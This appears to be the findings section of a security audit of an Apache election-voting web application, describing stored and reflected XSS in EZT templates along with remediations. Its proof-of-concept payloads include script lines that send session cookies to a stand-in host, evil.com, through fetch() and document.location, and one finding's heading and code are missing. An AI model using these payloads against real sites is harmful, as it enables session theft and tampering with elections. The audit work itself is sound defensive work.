## Findings

### Critical Severity

#### ASVS-121-CRI-001: Stored XSS via Flash Messages Rendered Without HTML Encoding

**Severity:** CRITICAL  
**Gap Type:** B (Control EXISTS but NOT CALLED — `[format "html"]` available in EZT but not used)

**Location:**
- **File:** `v3/server/templates/flashes.ezt`
- **Lines:** 1–6
- **Related Files:** `v3/server/pages.py` (multiple flash calls)

**Related Functions Checked:**
- `flash_success()` in `pages.py`
- `flash_danger()` in `pages.py`
- `do_create_endpoint()` in `pages.py` (~line 455)
- `do_add_issue_endpoint()` in `pages.py` (~line 518)
- `do_update_issue_endpoint()` in `pages.py` (~line 537)
- `load_election_issue()` in `pages.py` (~line 426)

**Vulnerable Code (Template — `flashes.ezt`):**
```html
[for flashes]
    <div class="alert alert-[flashes.category] alert-dismissible fade show" role="alert">
        [flashes.message]
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
[end]
```

**Vulnerable Code (Python sources injecting user data into flashes — `pages.py`):**
```python
# ~line 455
await flash_success(f'Created election: {form.title}')

# ~line 518
await flash_success(f'Issue "{form.title}" has been added.')

# ~line 537
await flash_success(f'Issue "{form.title}" has been updated.')

# ~line 426
await flash_danger(f'Invalid issue ID: {iid}')
```

**Data Flow:**
```
POST /do-create-election [form.title = "<img src=x onerror=alert(document.cookie)>"]
  → pages.py:do_create_endpoint() → flash_success(f'Created election: {form.title}')
  → quart session storage (flash)
  → redirect to /manage/<eid>
  → flashes.ezt: [flashes.message] rendered WITHOUT encoding
  → <div class="alert ..."><img src=x onerror=alert(document.cookie)>...</div>
  → XSS executes
```

**Proof of Concept:**
```http
POST /do-create-election HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=<valid_session>

title=<img+src%3Dx+onerror%3Dalert(document.cookie)>&csrf_token=placeholder
```
On redirect, the flash message `Created election: <img src=x onerror=alert(document.cookie)>` renders unencoded, executing JavaScript.

**Impact:** Any authenticated user creating an election or issue with a malicious title triggers XSS on the subsequent page load. Since flash messages persist in the session, the victim is the user performing the action. An attacker who social-engineers a user into submitting a crafted form (e.g., via CSRF — noted as incomplete) could exploit this against other users.

**Remediation:**
```html
[for flashes]
    <div class="alert alert-[flashes.category] alert-dismissible fade show" role="alert">
        [format "html"][flashes.message][end]
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
[end]
```

#### ASVS-121-CRI-002: Stored XSS via User-Controlled Data Rendered in HTML Context Without Encoding Across Multiple Templates

**Severity:** CRITICAL  
**Gap Type:** B (Control EXISTS — `[format "js,html"]` is used for JS onclick contexts in the **same template files** — but NOT CALLED for HTML body rendering contexts)

**Location:**
- **Files:** 
  - `v3/server/templates/manage.ezt` (lines ~241, ~283)
  - `v3/server/templates/manage-stv.ezt` (lines ~175, ~196)
  - `v3/server/templates/admin.ezt` (line ~19)
  - `v3/server/templates/voter.ezt` (lines ~49, ~96)
  - `v3/server/templates/vote-on.ezt` (lines ~88, ~131, ~163)

**Related Functions Checked:**
- `do_add_issue_endpoint()` in `pages.py`
- `election.add_issue()` in `election.py`
- `election.list_issues()` in `election.py`
- `rewrite_description()` in `pages.py`
- `manage_page()` in `pages.py`
- `vote_on_page()` in `pages.py`
- `admin_page()` in `pages.py`

**Vulnerable Code (manage.ezt — demonstrating the Type B gap):**

HTML context — **NOT encoded:**
```html
<!-- manage.ezt ~line 241 -->
<strong>[issues.title]</strong>
```
```html
<!-- manage.ezt ~line 283 -->
<div id="description-[issues.iid]" class="description mt-2">[issues.description]</div>
```

JavaScript context in the **same file** — **IS encoded:**
```html
<!-- manage.ezt ~line 261 -->
onclick="openEditIssueModal('[issues.iid]',
                            '[format "js,html"][issues.title][end]',
                            '[format "js,html"][issues.description][end]')"
```

**Additional Vulnerable Locations:**
```html
<!-- admin.ezt -->
<h5 class="card-title">[owned.title]</h5>

<!-- voter.ezt -->
<h5 class="card-title mb-3">[open_elections.title]</h5>

<!-- vote-on.ezt -->
<h1 class="h4 mb-0 fw-semibold">[election.title]</h1>
<strong>[issues.title]</strong>
```

**Data Flow:**
```
POST /do-add-issue/<eid> [form.title = "<script>fetch('https://evil.com/'+document.cookie)</script>"]
  → pages.py:do_add_issue_endpoint() → election.add_issue(form.title, ...)
  → SQLite database (stored)
  → GET /manage/<eid> or GET /vote-on/<eid>
  → election.list_issues() → template: <strong>[issues.title]</strong>
  → <strong><script>fetch(...)</script></strong>
  → Stored XSS executes for ALL users viewing this election
```

**Proof of Concept:**
```http
POST /do-add-issue/abc1234567 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=<valid_session>

title=%3Cscript%3Efetch('https://evil.com/'+document.cookie)%3C/script%3E&description=test&csrf_token=placeholder
```
Every voter accessing `/vote-on/abc1234567` will execute the script.

**Impact:** An election administrator can inject persistent JavaScript that executes in the browsers of **all voters** viewing the election. This compromises voter session cookies, enables vote manipulation, and breaks election integrity.

**Remediation:**
Apply `[format "html"]` to all user-controlled template variables in HTML contexts:
```html
<strong>[format "html"][issues.title][end]</strong>
<div class="description mt-2">[format "html"][issues.description][end]</div>
<h5 class="card-title">[format "html"][owned.title][end]</h5>
<h1 class="h4 mb-0 fw-semibold">[format "html"][election.title][end]</h1>
```

Additionally, fix `rewrite_description()` in `pages.py` to HTML-encode description text before wrapping in HTML:
```python
import html

def rewrite_description(issue):
    desc = html.escape(issue.description)  # Encode FIRST
    def repl(match):
        filename = html.escape(match.group(1))
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

#### ASVS-121-CRI-003: Stored XSS via Unencoded Server Data Embedded in JavaScript Context in vote-on.ezt

**Severity:** CRITICAL  
**Gap Type:** B (Control EXISTS — `[format "js,html"]` is used in `manage.ezt` JS onclick handlers — but NOT CALLED for inline JavaScript data embedding in `vote-on.ezt`)

**Location:**
- **File:** `v3/server/templates/vote-on.ezt`
- **Lines:** ~215–228 (inline `<script>` block)

**Related Functions Checked:**
- `vote_on_page()` in `pages.py` (~line 258–263)
- `election.list_issues()` in `election.py`

**Vulnerable Code:**
```javascript
const STV_CANDIDATES = {
    "[issues.iid]": {
      seats: [issues.seats],
      title: "[issues.title]",
      candidates: [
        { label: "[issues.candidates.label]", name: "[issues.candidates.name]" },
      ]
    },
};
```

**Source (pages.py ~line 258–263):**
```python
for issue in issues_stv:
    issue.seats = issue.kv.get('seats', 0)
    issue.labelmap = edict(issue.kv.get('labelmap', {}))
    issue.candidates = [{'label': k, 'name': v} for k, v in issue.labelmap.items()]
```

**Data Flow:**
```
Admin creates STV issue with title: test", x: 1}; fetch('https://evil.com/'+document.cookie);//
  → stored in database
  → GET /vote-on/<eid>
  → vote_on_page() → template rendering
  → JS: title: "test", x: 1}; fetch('https://evil.com/'+document.cookie);//"
  → JavaScript injection executes
```

**Proof of Concept:**
An election admin sets an STV issue title to:
```
test", _: 0}; document.location='https://evil.com/?c='+document.cookie;//
```
Or sets a candidate name in the KV labelmap to the same payload.

When any voter visits `/vote-on/<eid>`, the rendered JavaScript becomes:
```javascript
title: "test", _: 0}; document.location='https://evil.com/?c='+document.cookie;//",
```
This breaks out of the string literal and injects arbitrary JavaScript.

**Impact:** An election administrator can inject JavaScript that executes in the context of **every voter** who opens the voting page. The client-side `escapeHtml()` function in the same file does NOT protect against this — it only applies to dynamic DOM operations, not the server-rendered inline data block.

**Remediation:**
Use `[format "js"]` or `[format "js,html"]` for all user-controlled values in JavaScript contexts:
```javascript
const STV_CANDIDATES = {
    "[issues.iid]": {
      seats: [issues.seats],
      title: "[format "js"][issues.title][end]",
      candidates: [
[for issues.candidates]        { label: "[format "js"][issues.candidates.label][end]", name: "[format "js"][issues.candidates.name][end]" },
[end]      ]
    },
};
```

**Location:**

**Vulnerable Code (e_bad_eid.ezt):**
```html

```

**Vulnerable Code (pages.py — `load_election` decorator):**
```python

    try:
        e = steve.election.Election(DB_FNAME, eid)
    except steve.election.ElectionNotFound:
        result = await basic_info()
        result.title = 'Unknown Election'
        result.eid = eid  # User-controlled URL parameter set directly
        raise_404(T_BAD_EID, result)
```

**Data Flow:**
```
GET /vote-on/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
  → Quart URL-decodes: eid = "<img src=x onerror=alert(1)>"
  → ElectionNotFound raised
  → result.eid = "<img src=x onerror=alert(1)>"
  → e_bad_eid.ezt: The Election ID ([eid]) → rendered without encoding
  → <img src=x onerror=alert(1)> in HTML response
  → Reflected XSS
```

**Proof of Concept:**
```
GET /manage/%3Csvg%20onload%3Dalert(document.domain)%3E HTTP/1.1
```
The 404 page renders: `The Election ID (<svg onload=alert(document.domain)>) does not exist...`

**Impact:** An attacker can craft a URL that, when clicked by an authenticated user, executes arbitrary JavaScript in the context of the voting application. This enables session hijacking of authenticated ASF committers.

**Remediation:**
```html
<!-- e_bad_eid.ezt -->
The Election ID ([format "html"][eid][end]) does not exist, ...

<!-- e_bad_iid.ezt -->
The Issue ID ([format "html"][iid][end]) does not exist, ...

<!-- e_bad_pid.ezt -->
The Person ID ([format "html"][pid][end]) does not exist, ...
```

## Architecture Observations

1. **EZT does not auto-escape by default.** Unlike modern template engines (Jinja2 with autoescape, Django templates), EZT renders variables verbatim. This means every output point requires explicit `[format]` directives. The codebase demonstrates awareness of this (using `[format "js,html"]` in some places) but applies it inconsistently — only in JavaScript attribute contexts, never in HTML body contexts.

2. **The encoding gap is systematic, not incidental.** Every template that renders user-controlled data in HTML body context lacks encoding. This suggests the developers may have believed EZT auto-escapes (it does not), or that the `[format]` directive was only needed for JavaScript contexts.

3. **The `rewrite_description()` function creates an encoding anti-pattern.** By intentionally constructing HTML (`<pre>`, `<a>`) from user input without pre-escaping, it makes template-level encoding impossible (encoding would break the intended tags). The fix requires encoding at the function level before HTML construction.

### Immediate Actions (Priority 1)

| Action | Effort | Impact | Files Affected |
|--------|--------|--------|----------------|
| Add `[format "html"]` to ALL user-controlled variables in HTML contexts across all `.ezt` templates | Medium | Eliminates stored and reflected XSS across entire application | All 17 `.ezt` template files |

### Short-term Actions (Priority 2-3)

| Action | Effort | Impact | Files Affected |
|--------|--------|--------|----------------|
| Fix `rewrite_description()` to HTML-escape description content before wrapping in `<pre>`/`<a>` tags | Low | Eliminates description-based stored XSS on voting page | `v3/server/pages.py` |
| Add `[format "js"]` to all user-controlled values in inline `<script>` blocks in `vote-on.ezt` | Low | Eliminates JavaScript injection on voting page | `v3/server/templates/vote-on.ezt` |

### Long-term Actions (Priority 4-5)

| Action | Effort | Impact |
|--------|--------|--------|
| Consider migrating to Jinja2 with `autoescape=True` or configuring a global EZT encoding default | High | Eliminates the entire class of encoding omission bugs systematically |
| Implement a template security review checklist requiring `[format]` on every variable that is not a server-set constant | Low | Prevents regression in new templates |
